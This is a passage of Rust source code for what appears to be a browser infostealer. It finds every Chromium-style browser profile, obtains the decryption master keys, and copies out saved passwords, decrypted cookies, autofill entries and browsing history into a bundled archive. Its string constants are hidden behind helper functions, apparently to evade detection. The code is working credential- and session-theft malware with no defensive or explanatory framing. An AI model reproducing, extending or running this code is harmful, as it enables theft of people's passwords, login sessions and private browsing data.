    let db_path = if profile_path.join(s_network()).join(s_cookies()).exists() {
        profile_path.join(s_network()).join(s_cookies())
    } else {
        profile_path.join(s_cookies())
    };
    let temp = copy_db(&db_path)?;
    let conn = Connection::open(&temp).ok()?;
    let mut stmt = conn.prepare(&s_sql_cookies()).ok()?;
    let rows = stmt.query_map([], |row| {
        let host: String = row.get(0)?;
        let name: String = row.get(1)?;
        let enc_value: Vec<u8> = row.get(2)?;
        let plain_value: String = row.get(3)?;
        let path: String = row.get(4)?;
        let expires: i64 = row.get(5)?;
        let is_secure: i64 = row.get(6)?;
        let is_httponly: i64 = row.get(7)?;
        Ok((host, name, enc_value, plain_value, path, expires, is_secure, is_httponly))
    }).ok()?;
    let mut count = 0;
    let mut body = String::new();
    for row in rows.flatten() {
        let (host, name, enc_value, plain_value, path, expires, is_secure, is_httponly) = row;
        if name.is_empty() {
            continue;
        }
        let value = decrypt_cookie_value(&enc_value, &plain_value, keys);
        let unix_expires = if expires > 0 {
            (expires / 1_000_000) - 11644473600
        } else {
            0
        };
        body.push_str(&super::netscape::format_line(
            &host,
            &path,
            is_secure != 0,
            unix_expires,
            &name,
            &value,
            is_httponly != 0,
        ));
        count += 1;
    }
    drop(stmt);
    drop(conn);
    cleanup_db(&temp);
    if count == 0 {
        None
    } else {
        super::netscape::build_file(&body)
    }
}

fn profiles_from_local_state(user_data_path: &Path) -> Vec<(String, PathBuf)> {
    let local_state = user_data_path.join(s_local_state());
    let content = match fs::read_to_string(&local_state) {
        Ok(c) => c,
        Err(_) => return Vec::new(),
    };
    let json: Value = match serde_json::from_str(&content) {
        Ok(v) => v,
        Err(_) => return Vec::new(),
    };

    let mut profiles = Vec::new();
    if let Some(cache) = json
        .pointer(&s_profile_info_cache())
        .and_then(|v| v.as_object())
    {
        for name in cache.keys() {
            if name == s_system_profile() {
                continue;
            }
            let path = user_data_path.join(name);
            if path.is_dir() {
                profiles.push((name.clone(), path));
            }
        }
    }

    profiles.sort_by(|a, b| {
        profile_sort_key(&a.0).cmp(&profile_sort_key(&b.0))
    });
    profiles
}

fn profile_sort_key(name: &str) -> (u8, u32, String) {
    if name == s_default() {
        return (0, 0, String::new());
    }
    if name == s_guest_profile() {
        return (2, 0, String::new());
    }
    if let Some(n) = name.strip_prefix(&s_profile_prefix()) {
        if let Ok(num) = n.parse::<u32>() {
            return (1, num, String::new());
        }
    }
    (1, u32::MAX, name.to_lowercase())
}

fn get_profiles(user_data_path: &Path, has_profiles: bool) -> Vec<(String, PathBuf)> {
    if !has_profiles {
        if user_data_path.exists() {
            return vec![(s_default(), user_data_path.to_path_buf())];
        }
        return Vec::new();
    }

    let mut profiles = profiles_from_local_state(user_data_path);
    let mut seen: std::collections::HashSet<String> = profiles.iter().map(|(n, _)| n.clone()).collect();

    if let Ok(entries) = fs::read_dir(user_data_path) {
        for entry in entries.flatten() {
            if !entry.path().is_dir() {
                continue;
            }
            let name = entry.file_name().to_string_lossy().to_string();
            if name == s_system_profile() || name.starts_with(&s_dot()) {
                continue;
            }
            let is_profile = name == s_default()
                || name == s_guest_profile()
                || name.starts_with(&s_profile_prefix())
                || entry.path().join(s_preferences()).exists()
                || entry.path().join(s_network()).join(s_cookies()).exists()
                || entry.path().join(s_cookies()).exists();
            if is_profile && seen.insert(name.clone()) {
                profiles.push((name, entry.path()));
            }
        }
    }

    profiles.sort_by(|a, b| profile_sort_key(&a.0).cmp(&profile_sort_key(&b.0)));
    profiles
}

fn extract_autofill(profile_path: &Path) -> Option<String> {
    let temp = copy_db(&profile_path.join(s_web_data()))?;
    let conn = Connection::open(&temp).ok()?;
    let mut stmt = conn.prepare(&s_sql_autofill()).ok()?;
    let mut output = String::new();
    let rows = stmt.query_map([], |row| {
        let name: String = row.get(0)?;
        let value: String = row.get(1)?;
        let count: i64 = row.get(2)?;
        Ok((name, value, count))
    }).ok()?;
    for row in rows.flatten() {
        let (name, value, count) = row;
        output.push_str(&apply_template(
            &s_autofill_fmt(),
            &[&name, &value, &count.to_string(), &s_sep50()],
        ));
    }
    drop(stmt); drop(conn); cleanup_db(&temp);
    if output.is_empty() { None } else { Some(output) }
}

fn extract_history(profile_path: &Path) -> Option<String> {
    let temp = copy_db(&profile_path.join(s_history()))?;
    let conn = Connection::open(&temp).ok()?;
    let mut stmt = conn.prepare(&s_sql_history()).ok()?;
    let mut output = String::new();
    let rows = stmt.query_map([], |row| {
        let url: String = row.get(0)?;
        let title: String = row.get(1)?;
        let visit_count: i64 = row.get(2)?;
        let last_visit: i64 = row.get(3)?;
        Ok((url, title, visit_count, last_visit))
    }).ok()?;
    for row in rows.flatten() {
        let (url, title, visit_count, last_visit) = row;
        output.push_str(&apply_template(
            &s_history_fmt(),
            &[
                &url,
                &title,
                &visit_count.to_string(),
                &last_visit.to_string(),
                &s_sep50(),
            ],
        ));
    }
    drop(stmt); drop(conn); cleanup_db(&temp);
    if output.is_empty() { None } else { Some(output) }
}

pub fn extract_all() -> Vec<(String, String)> {
    if !env_configured() {
        return Vec::new();
    }

    let mut results = Vec::new();
    for browser in get_browsers() {
        if !browser.user_data.exists() {
            continue;
        }
        let keys = get_master_keys(&browser.user_data, &browser.name);
        if keys.is_none() {
            continue;
        }
        let profiles = get_profiles(&browser.user_data, browser.has_profiles);
        for (profile_name, profile_path) in profiles {
            let keys = keys.as_ref().unwrap();
            let passwords = extract_passwords(&profile_path, keys);
            let cookies = extract_cookies(&profile_path, keys);
            let autofill = extract_autofill(&profile_path);
            let history = extract_history(&profile_path);

            super::zip_layout::push_profile_bundle(
                &mut results,
                &browser.name,
                &profile_name,
                passwords,
                cookies,
                autofill,
                history,
            );
        }
    }
    results
}
